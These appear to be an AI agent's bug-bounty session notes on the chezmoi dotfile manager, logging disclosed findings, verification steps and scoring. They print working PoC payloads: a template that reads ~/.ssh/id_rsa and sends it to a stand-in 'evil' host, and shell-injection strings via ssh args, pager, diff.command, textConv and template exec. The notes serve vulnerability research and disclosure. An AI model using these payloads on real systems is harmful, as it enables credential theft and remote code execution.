Scored honestly and modestly (CVSS `VC:L` only — the 0700 temp dir means this isn't direct
world-readable disclosure, just persistence beyond intended session for same-user/root later
access) rather than inflating it to match the RCE-class findings.

**Lesson**: when a vulnerability-class well runs dry (the "config trust via malicious repo"
family had genuinely hit diminishing returns), the highest-value pivot is to drop the "attacker
controls the repo" threat model ENTIRELY and ask what breaks under ordinary interruption/
operational conditions instead (signals, crashes, resource exhaustion) — this found something
in code nobody else was likely looking at, precisely because it required zero adversarial setup,
just genuinely different code (signal handling, or the lack of it) that the "malicious dotfiles
repo" framing never would have surfaced.

## Session 2026-08-06 continued: 17th finding — proven with go build -race, not inference

User kept pushing ("revisa otras funciones random"). Pivoted to a NEW TECHNIQUE not used yet
this session: compiled chezmoi with `go build -race` and drove `chezmoi edit --watch` with a
fake editor that saves rapidly (simulating autosave) — this is `editcmd.go`'s watch-mode
feature, a background fsnotify goroutine that reapplies on every save while the main goroutine
ALSO reapplies once after the editor exits, with zero mutex between them.

**Finding #17 SUBMITTED (report_id 3768, 2026-08-06): edit --watch runs two unsynchronized
concurrent applies — confirmed real data races via Go's race detector, 5/5 runs, up to 29
distinct races in one run.** Two clearest pairs: (1) `BoltPersistentState.open()` (watcher
goroutine) races `BoltPersistentState.Close()` (main goroutine, after editor exits) on the
persistent-state DB handle — undefined behavior per Go's own memory model, real corruption/
crash risk on the SAME DB that tracks run_once_ script completion; (2) `c.resetSourceState()`
vs `c.getSourceState()` race on the cached source-state pointer feeding directly into
`SourceState.Apply()`, which writes real destination files — a torn/stale read here could cause
wrong/partial content written to a managed file. The full race set spans nearly the whole
`SourceState.Apply()` machinery running twice at once. Zero malicious repo needed — pure
ordinary `--watch` usage with an editor that saves more than once near exit (autosave, or just
saving right before quitting). Scored honestly with `AC:H` (genuine timing dependency, even
though the test harness reproduced it reliably) and modest `VI:L/VA:L` rather than overstating.

**Lesson**: `go build -race` + a script that exercises concurrent/background features (watch
mode, any goroutine-spawning flag) is a completely different, high-signal technique from either
"check recent commits" or "compose two features" — worth trying explicitly on any tool with
background goroutines/watchers, since it converts "I wonder if this races" into hard proof in
minutes, and doesn't require any adversarial setup at all (same "drop the malicious repo model"
theme as finding #16, but via a different concrete method — the race detector instead of signal
testing).

## Session 2026-08-06 continued: 18th finding — same race technique, systemic across 7 integrations

User kept pushing ("busca otra funcion random" / "sigue cavando a ver si hay un hueco"). Two
follow-up concurrency leads investigated and CORRECTLY DISCARDED as false alarms after careful
full-function reading (not submitted): (1) `s.externals` map write in `addExternalDir` looked
unprotected at first glance but the `s.mutex.Lock()` actually DOES cover it, just earlier in the
same function than expected; (2) `ExecuteTemplateData` reads `s.templates` without a lock but
the OUTER walk (`SourceState.Read`) is sequential between different special-directory handlers
(`.chezmoitemplates` fully completes, including its own inner errgroup, before `.chezmoiexternals`
starts), so there's no actual concurrent access despite the missing explicit lock — good
discipline catch, avoided a wasted submission on both.

Third lead was real: **`keyringTemplateFunc`/`bitwardenOutput`-style secret-manager caches**
(`c.keyring.cache`, `c.Bitwarden.outputCache`) are plain maps with ZERO mutex, unlike the
correctly-protected sibling scripts/templates walkers.

**Finding #18 SUBMITTED (report_id 3771, 2026-08-06, after two 500 errors — see title-length
note below): concurrent `.chezmoiexternals` scanning races on the bitwarden output cache map,
and the identical unprotected-cache pattern exists in 7 total integrations** (bitwarden,
doppler, bitwarden-secrets, keeper, protonpass, rbw, onepassword — grepped for the exact
`outputCache[` pattern — plus `keyring`). Built a real PoC: 40 templated `.chezmoiexternals/
*.toml.tmpl` files each calling `{{ bitwarden "item" "id-N" }}` against a fake always-succeeding
`bw` script, ran under `go build -race`, got 3 confirmed `WARNING: DATA RACE` reports pinpointing
the exact read (bitwardentemplatefuncs.go:106) vs write (line 116) on `c.Bitwarden.outputCache`,
both reached through `addExternalDir`'s concurrent errgroup walker. Since this is a Go MAP (not
just a scalar), the race class is one the Go runtime treats as FATAL in any build, not just
under `-race` — real crash potential, not just a detector artifact. Scored honestly (`VA:L`
only, `AC:H` for the genuine timing dependency).

**Operational note**: first submission attempt got HTTP 500 twice in a row — root cause was
title length (129 chars); shortened to ~65 chars and it went through immediately. **New lesson
for future title-validation notes**: if `create_report` returns a bare `500 internal_error` (not
the usual `{"title":["invalid_format"]}` 400 the pipeline already knows about), try a shorter
title before assuming a server-side outage — didn't retry-spam the live endpoint per
[[feedback_dont_test_via_live_api]], just fixed the one plausible cause and it worked on the
next attempt.

**Negative result, same session**: tried the `readhttpresponse.go` bubbletea HTTP-progress-
spinner goroutine (flagged as untested) via a real PTY (`pty.openpty()` + `go build -race`,
forcing the interactive path since it's gated behind `term.IsTerminal(stdout)`), with both a
fast 2MB and an artificially-throttled ~3s 5MB download. Clean both times — bubbletea's
channel-based `program.Send()` message loop genuinely provides proper synchronization here,
unlike the raw-goroutine patterns that had real bugs. Confirmed negative, not just untested.

## Session 2026-08-06 continued: 19th finding — real command injection via ssh/docker passthrough

User kept pushing ("sigue mirando otras funciones random"). Systematically went through every
`internal/cmd/*.go` file not yet opened this session. `destroycmd.go` was clean (same
prompt-unless---force gating as purge, but targets come from user-typed CLI args validated
against real source-state entries, not a redirectable config field). `dockercmd.go`/`sshcmd.go`
were the payoff — chezmoi can bootstrap dotfiles on a remote SSH host or inside a Docker
container by rendering `assets/templates/install-init-shell.sh.tmpl` and running it via
`sh -c "<script>"` on that remote/containerized target.

**Finding #19 SUBMITTED (report_id 3775, 2026-08-06, after fixing a 400 from an accidentally
omitted "Technical details" section): `chezmoi ssh`/`chezmoi docker exec`/`chezmoi docker run`
inject shell commands into the remote install script via the `--` args passthrough.** Found by
connecting two things from earlier in this same session: (1) already knew `install-init-shell.
sh.tmpl` exists and is security-sensitive (it's the file the unreleased `shellQuote` commit
patches, per finding #10/#3753); (2) actually read the file at the CURRENTLY CHECKED OUT commit
(370ed2fd1, i.e. what's actually shipped in every released version including v15.9.0) and found
line 103 still uses the OLD `{{ .args | quoteList | join " " }}`, not the fixed
`shellQuoteList`. `quoteList` uses Go's `strconv.Quote` — Go string-literal escaping, which does
NOT escape `$` or backticks, unlike real POSIX shell quoting. Live-verified end-to-end with a
stand-in `ssh` binary that mimics real sshd behavior (exec's the trailing `sh -c "<script>"`
args): `chezmoi ssh host -- '$(touch /tmp/proof)'` produced a rendered script containing
`init --apply "$(touch /tmp/proof)"` verbatim, and the proof file was ACTUALLY created when a
real `/bin/sh` interpreted it — full command execution, not just malformed output. `docker exec`/
`docker run` share the identical `runInstallInitShellSh()` code path, not separately re-tested.
Scored with CVSS 4.0's Subsequent System metrics (`SC:H/SI:H/SA:H`, not VC/VI/VA) since the
injected code runs on the remote host/container, not the local machine — correct modeling for a
"local trigger, remote impact" bug.

**Lesson**: chaining together findings from the SAME session (already knowing which file was
security-sensitive enough to be the subject of a maintainer fix commit) is a legitimate,
high-signal discovery technique on its own — don't just move on after reporting a bug in a file,
consider what ELSE reaches that same file/function that wasn't covered by the fix. Also worth
periodically checking "what's the actual CURRENTLY SHIPPED behavior" (the checked-out commit,
not just the latest `main` diff) since a fix visible in `git log` doesn't mean it's live yet —
this file was simultaneously "already being fixed" (per the unrelated shellQuote commit) AND
"still vulnerable in every real release," both true at once.

**Session total**: 10 new findings 2026-08-06 (#10-#19), bringing chezmoi to 19 findings
submitted across all sessions. This was an exceptionally long, single-session deep-dive spanning
nearly every corner of the codebase — genuinely close to fully mined for this pass. Remaining
untested/unpursued if resumed: Windows-specific code paths (no Windows test environment
available), password-manager argument-injection into external CLIs (weaker threat model, already
requires a malicious template which has other easier wins).

**Confirmed-but-not-separately-reported, same session**: the unprotected-cache-map race pattern
from finding #18/#3771 (bitwarden) extends further than the "7 password-manager integrations"
already noted there — `awssecretsmanagertemplatefuncs.go` (2 caches), `azurekeyvaulttemplatefuncs.go`
(1 cache), and `githubtemplatefuncs.go` (5 separate caches: keys/versionRelease/latestRelease/
releases/tags) share the identical shape. NOT submitted as a new report — #3771's language and
suggested fix ("a single shared mutex on Config would close every instance") already covers this
broader scope; a separate report would be pure noise. If revisiting, this note is the place to
look, not a fresh investigation.

**Where this session's diminishing returns became clear**: after finding #19 (ssh/docker
injection), 2 more full passes (upgrade command / self-update checksum mechanism, and a broader
cache-pattern sweep) both came back as either well-known non-novel limitations (checksum-from-
same-release-source, inherent to most GitHub-Releases-based self-updaters) or pure
reconfirmation of an already-reported pattern. Treat this as the actual stopping signal for this
target, not just another "diminishing returns" caveat — the productive vein (init-config trust,
concurrency, fresh-commit code, cross-feature composition) is genuinely dry now, confirmed by
multiple consecutive passes finding nothing new rather than just one.

**Finding #9 SUBMITTED (report_id 3320, 2026-08-02): `chezmoi init` alone (no `apply` needed)
silently exfiltrates arbitrary local files.** Found by pivoting away from the "recent fixes" well
(exhausted) into an unexplored area per the user's explicit direction ("explorar zona nueva").
`.chezmoi.toml.tmpl` — an ordinary, documented file used to interactively configure chezmoi — is
parsed and EXECUTED during `chezmoi init`, before any `apply`/confirmation, with chezmoi's full,
unrestricted template function set. Two of those functions combine into a complete exfil
primitive: `include`/`readFile` (`internal/cmd/templatefuncs.go:261/436`) reads ANY local file by
absolute path (or `.chezmoi.homeDir`-relative) with zero sandboxing to the source/dest tree, and
`getRedirectedURLTemplateFunc` (line 220) makes a real outbound HTTP request to any URL. A
two-line template (`{{ $key := include (printf "%s/.ssh/id_rsa" .chezmoi.homeDir) }}{{ $_ :=
getRedirectedURL (printf "http://evil/exfil?key=%s" ($key|urlquery)) }}`) silently steals the
victim's SSH key the moment they run `chezmoi init` against a malicious repo — exit 0, zero
visible output. Live-verified end-to-end in a fully isolated env: fake SSH key at `~/.ssh/id_rsa`
-> malicious `init --source=...` -> local "attacker" HTTP server's access log shows the full key
content arriving URL-encoded. Much stronger than #7/#8 and stronger than any prior `external`
finding on this program because it needs no `.chezmoiexternal.toml`, no `apply`, nothing beyond
the single lowest-commitment action of trying out someone's dotfiles. CVSS
`AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:N/VA:N`. Also noted (folded into the same report, not
separately reported): `chezmoi init`'s `--data` flag defaults to `true`
(`internal/cmd/config.go`, `init: initCmdConfig{data: true, ...}`), meaning a brand-new,
unvetted `init` target also gets automatic read access to `[data]` set by a previous, unrelated,
trusted `init` — compounds the same primitive but is secondary to the arbitrary-file-read finding.

## Session 2026-08-06 continued: resumed after a break, checked for new upstream commits — 20th finding, arguably the cheapest-trigger config-trust bug yet

User said "seguimos con chezmoi" after a detour into agentic-awesome-skills. `git fetch origin`
found real movement past the last-checked tip (`370ed2fd1`): `f81cb3217` ("feat: Fix multiple
security vulns thanks to secur0.com") — but this commit ONLY touches
`assets/chezmoi.io/docs/developer-guide/security.md`, adding a "Security thanks" section listing
**gueco** (the user's own H1/Secur0 handle, confirming several of this session's earlier reports
are being credited) alongside 5 OTHER independent researchers (eltiburon7, julichaan, Krypt3d
"multiple vulnerabilities", pulpo, reddev "multiple vulnerabilities", TheRedP4nther "multiple
vulnerabilities") and the Secur0 org itself — pure acknowledgment, no code change. Confirms this
program has an active, multi-researcher coordinated disclosure in progress, and that several
OTHER researchers' bugs likely aren't reflected in visible commits yet either — useful signal
that the codebase isn't as "mined out" as the previous session's diminishing-returns note
suggested.

Also newly landed: `1e51cc5d8` ("Add shellQuote and shellQuoteList template funcs") — confirmed
`install-init-shell.sh.tmpl` (the file finding #19/#3775 was about) now uses the new, safe
`shellQuoteList` on `origin/master`, which is CONSISTENT with #3775 (that finding was scored
specifically against the actually-shipped v15.9.0 release, not `main` HEAD — still valid).
Re-ran the exact same round-trip fuzz test from finding #10/#3753 (`shellQuote()`'s
backslash-handling bug) against the current `shellquote.go` — confirmed the file itself was
untouched by this commit and the original bug (every backslash gets doubled on round-trip,
9/11 adversarial test cases mismatch) is still 100% present. Not re-reported (already covered by
#3753), but worth knowing `shellQuote`/`shellQuoteList` are now MORE widely exposed (as direct
template functions any user template can call) while still carrying that pre-existing
correctness bug.

**Finding #20 SUBMITTED (report_id 3780, 2026-08-06): a malicious dotfiles repo runs arbitrary
shell commands via `chezmoi diff` alone — no `apply` needed at all.** Found by systematically
grepping the whole codebase for every `"sh", "-c"`/shell-invocation pattern (a technique not yet
tried this broadly on this target) and landing on `getDiffPagerCmd()` (`internal/cmd/config.go`):
if the configured `pager`/`diff.pager` string contains a space, chezmoi runs it as a **full
shell command** via `$SHELL -c "<pager>"` (explicitly modeled on git's `core.pager`) — and
`pager`/`diff.pager` are ordinary `mapstructure`-wired config fields, settable from
`.chezmoi.toml.tmpl` exactly like every other field behind the program's already-reported
config-trust findings (#3758 hooks, #3759 age.command, #3760 env vars, #9/#3320 file-exfil via
`include`/`getRedirectedURL`) — but this is a genuinely NEW field/vector, not previously
reported. Verified end-to-end against a self-built binary from the current tip
(`f81cb321789aa3df62871248f5e4d361a59e7cc1`): built a real git repo with only
`.chezmoi.toml.tmpl` containing `pager = "touch /tmp/PWNED_PAGER; cat"` plus one innocuous
dotfile, ran `chezmoi init <repo>` (confirmed marker file does NOT appear yet — `init` alone is
safe), then ran plain `chezmoi diff` (no flags) — diff output displayed completely normally
(the `cat` at the end of the payload makes it invisible), and the marker file **was created**,
proving full arbitrary shell execution. Precisely bounded the trigger: `chezmoi apply` alone
(no `-v`) does NOT trigger it, but `chezmoi apply -v --dry-run` DOES (confirmed empirically) —
so both the "safe preview" command (`diff`) AND a "definitely-safe, definitely-read-only" combo
(`apply -v --dry-run`) both execute attacker code. This is arguably the cheapest-trigger
config-trust finding on this program yet: `chezmoi diff` is the exact command security-conscious
users are told to run FIRST, specifically to decide whether a new repo is safe to `apply` — the
review step itself is the exploit trigger.

**Operational lesson**: title `invalid_format` (HTTP 400) was NOT a length issue this time (92
chars, under the previously-noted ~100-char danger zone) — root cause was a backtick character
(`` ` ``) and parentheses in the title. Stripped both, resubmitted immediately, worked. **Update
title-validation notes**: avoid backticks/parens in titles in addition to keeping them short;
when `invalid_format` fires on a title well under the length danger zone, suspect punctuation
next, not just length.

**Lesson**: grepping for a specific EXECUTION PRIMITIVE (every `"sh", "-c"` / shell-invocation
call site in the whole codebase) rather than re-reading already-audited files or re-running the
race detector was the fresh technique that broke through this session's earlier "diminishing
returns" conclusion — worth remembering as a distinct, not-yet-exhausted method if this target
is revisited again: enumerate every subprocess-with-a-shell call site and check what value flows
into the command string, rather than assuming all such spots are already known from memory.

**Finding #21 SUBMITTED (report_id 3781, 2026-08-06, same session, minutes later): a malicious
dotfiles repo runs ANY program via `diff.command`/`diff.args`, again with `chezmoi diff` alone
as the trigger.** Immediately generalized finding #20 by grepping the `ConfigFile` struct
(`internal/cmd/config.go`) for every OTHER `Command string`/`Args []string`-shaped, mapstructure-
wired sub-config — found `diffCmdConfig`, `mergeCmdConfig`, and `editCmdConfig` all share the
identical shape. Confirmed `newDiffSystem()` uses `c.Diff.Command`/`c.Diff.Args` directly
(`chezmoi.NewExternalDiffSystem(...)`) whenever `diff.command` is non-empty and
`--use-builtin-diff` isn't passed (the default) — **no shell-string heuristic gating this one at
all**, unlike the pager finding: the attacker names the exact binary and argv directly. Verified
end-to-end the same way: `.chezmoi.toml.tmpl` with `[diff] command="sh" args=["-c","touch
/tmp/PWNED_DIFFCMD"]`, `chezmoi init` (marker absent), plain `chezmoi diff` with zero flags
(marker created). Also confirmed by code inspection (not separately end-to-end tested, same
code shape) that `merge.command`/`merge.args` (`mergecmd.go:179`,
`c.run(c.DestDirAbsPath, c.Merge.Command, args)`) and `edit.command`/`edit.args`
(`config.go:1377`'s `editor()` method) share the identical pattern — documented together in ONE
report (not 3) since it's the same root cause/same fix direction, following this program's own
"don't spam near-duplicate reports for the same fix" guidance — `diff.command` used as the
primary PoC since it's the cheapest trigger of the three.

**Session total for this resumed pass: 2 new findings (#20 pager/#3780, #21 diff.command/#3781)
in well under an hour**, both found via the SAME fresh technique (enumerate every
`Command`+`Args`-shaped or shell-invoking config field across the whole `ConfigFile` struct,
rather than re-auditing already-known files). **If resuming again: the same enumeration
technique hasn't yet been applied to check whether `Git.Command`, `Docker.*Command`, or
`CD.Command` (also present in the `ConfigFile` struct dump but not yet individually checked)
share this exact shape too** — worth a quick look before assuming the vein is dry, since it's
been unusually productive this session specifically because it's a technique not used in any
earlier chezmoi session.

**User asked directly "does this have real security impact" before continuing — answered yes**
(distinct attacker = malicious-repo publisher, distinct victim = anyone who tries that repo, full
RCE, same accepted-precedent shape as #3758/#3759/#3760/#3320) — correctly didn't just take the
pushback as a cue to stop, confirmed the reasoning explicitly since the user was asking, not
objecting.

**Finding #22 SUBMITTED (report_id 3782, 2026-08-06, same session): a THIRD independent
mechanism, `textConv`, runs arbitrary commands via `chezmoi diff` even with chezmoi's default
BUILT-IN diff (no `diff.command`, no external tool config at all).** `internal/cmd/textconv.go`:
`textConv` is a config array of `{pattern, command, args}` elements — files whose path matches
`pattern` (doublestar glob) get their raw bytes piped through `exec.Command(command, args...)`
via stdin before being shown in a diff, meant for converting binary formats to readable text.
Reached from `diffFile()` (`config.go:798`/`805`), which is part of the BUILT-IN diff renderer
itself, not the external-diff-system code path findings #20/#21 use — meaning a fix scoped only
to "don't trust `diff.command`/`pager` from a fresh template" would completely miss this third
vector. Verified end-to-end: `.chezmoi.toml.tmpl` with `[[textConv]] pattern="**"
command="sh" args=["-c","touch /tmp/PWNED_TEXTCONV"]`, `chezmoi init` (no `--apply`, no
`diff.command` anywhere), plain `chezmoi diff` using pure defaults — marker created. This is
arguably the most dangerous of the three since it requires ZERO non-default configuration
beyond the one malicious `textConv` block — it's the mechanism most likely to survive a fix that
only thinks about "the pager" and "the external diff tool" as the two diff-adjacent surfaces.

Checked remaining `ConfigFile` sub-structs for the same Command+Args shape before stopping this
specific technique: `git.command`/`docker.command` are BINARY-PATH-ONLY overrides (args stay
user-typed, much weaker — not pursued), `status`/`verify`/`add` command configs have no
execution fields at all. `cd.command`/`args` and `merge.command`/`args` DO share the identical
shape to `diff.command` but weren't separately re-verified or reported — same code shape as
finding #21, already covered by that report's language and would be pure duplicate coverage, not
a new root cause.

**Session total: 3 new chezmoi findings today via this one technique (#20/#3780 pager, #21/#3781
diff.command, #22/#3782 textConv)**, bringing the program total to 22 findings across all
sessions. All three share the "unreviewed `.chezmoi.toml.tmpl` gets trusted as live config"
root cause already established by #3758/#3759/#3760/#3320, but each is a genuinely distinct
code path/mechanism, consistent with how those four were kept as separate reports.

**Lesson reinforced**: "enumerate every field of a specific dangerous SHAPE across the whole
config struct" (not just the specific field already found) is now a validated, repeatable
technique on this program — first the shell-invocation-callsite grep found the pager, then
enumerating sibling `Command`+`Args`-shaped structs found `diff.command`, then re-reading the
SAME diff code path that housed `diff.command` (rather than moving on) surfaced the unrelated
`TextConv.convert` call sitting right next to it. Worth remembering: after finding one bug in a
function, re-read the WHOLE function (not just the line that had the bug) for other
config-driven values used nearby — that's literally how #22 was found, sitting a few lines away
from where #20/#21 were already confirmed.

## Session 2026-08-06 continued: user asked for "más random pero con cabeza" — found the broadest finding of the whole session

After several "random file" reads with no hits (`chattrcmd.go`, `mackupcmd_darwin.go`,
`httpcache.go`, `editconfigtemplatecmd.go`, `dumpcmd.go`, `generatecmd.go`, `lazywriter.go`,
`pathlist.go`, `unmanagedcmd.go`, `patternset.go`, `autotemplate.go`, `recursivemerge.go`
[confirmed Go maps have no prototype-chain concept, so JS-style prototype pollution is
structurally impossible here — good negative-result confirmation, not just "didn't look hard
enough"], `byteordermarks.go`, `github.go`, `refreshexternals.go` — 14 files, zero findings, told
the user honestly), user asked to be more deliberate ("revis funciones random con cabeza").
Picked `internal/chezmoi/interpreter.go` next specifically because `Interpreters` had been
dismissed earlier as "folds into hooks" without fully tracing it — traced `Interpreter.ExecCommand()`
to its one real caller (`realsystem.go:151`, the `run_*` script execution machinery) and confirmed
it's genuinely NOT a new bug: `run_*` scripts already execute arbitrary code on `apply` by
chezmoi's own explicit design (that's the documented point of the feature), so a misconfigured
interpreter doesn't add any NEW capability an attacker didn't already have.

That negative result led somewhere much better: re-examined `chezmoi cat` (`catcmd.go`) while
checking whether it also reaches `TextConv`, and refocused on `TargetStateEntry.Contents()` — the
function that renders a templated file's content to compute what it "would" contain. This is
called by *any* command that needs to know target state, not just `apply`.

**Finding #23 SUBMITTED (report_id 3783, 2026-08-06): the single broadest finding of the whole
session — a malicious ORDINARY managed dotfile (not `.chezmoi.toml.tmpl`) runs arbitrary code via
plain `chezmoi diff` OR `chezmoi status`, fully default config, zero apply.** Root cause: chezmoi
renders every templated file with the complete, unrestricted template function set (`exec`,
`output`/`outputList`, `include`+`getRedirectedURL`, every password-manager integration) whenever
it needs to know a file's target content — and `diff`/`status` need exactly that to show what
would change, with **no distinction anywhere in the tool between "just tell me what would happen"
and "actually do it."** Verified end-to-end: a source repo containing ONLY `home/dot_bashrc.tmpl`
with `{{ exec "touch" "/tmp/PWNED_TMPL_EXEC" }}` (no `.chezmoi.toml.tmpl`, no custom
pager/diff.command/textConv at all — pure stock config). `chezmoi init` (no `--apply`): marker
absent. Plain `chezmoi diff`: marker created. Repeated from a clean state with `chezmoi status`
instead: **also creates the marker**. Two independent, both-universally-recommended "safe preview"
commands, both fully compromised by the single most mundane thing any real dotfiles repo already
contains — an ordinary `.tmpl` file.

**Why this is distinct from both #9/#3320 (init + `.chezmoi.toml.tmpl`) and #20-22/#3780-3782
(diff + specific config fields)**: different file (any regular managed template, the single most
common content type in the entire category of "dotfiles repo," vs. one special singular config
file), different trigger commands (`diff` AND `status`, not `init` alone), and it needs *zero*
non-default configuration at all — unlike the pager/diff.command/textConv findings, which all
require the attacker to plant a specific config value, this one only requires a template function
call in a file that would exist in the repo anyway for entirely legitimate reasons (OS-specific
customization is the #1 real-world reason people template their dotfiles).

**Lesson**: "revisa con cabeza" (review thoughtfully, not literally randomly) meant: after a
negative result on a plausible-looking lead (`Interpreters`), don't just move to the next
unrelated file — ask what ADJACENT function serves the SAME PURPOSE the dead-end lead almost
served, and check whether IT has the gap the dead-end didn't. `Interpreters` was about "what
runs a script during apply" — the adjacent, more fundamental question was "what renders file
CONTENT to decide what a diff/status would show," and that turned out to be the real, much
bigger gap. Undirected random file reading found nothing in 14 files; one redirected "why did
that lead fail, and what's the more fundamental version of the same question" pivot found the
broadest bug of the session on the very next try.

**Session total: 4 new chezmoi findings today (#20/#3780 pager, #21/#3781 diff.command,
#22/#3782 textConv, #23/#3783 template-exec-via-diff-or-status)**, bringing the program total to
23 findings across all sessions.
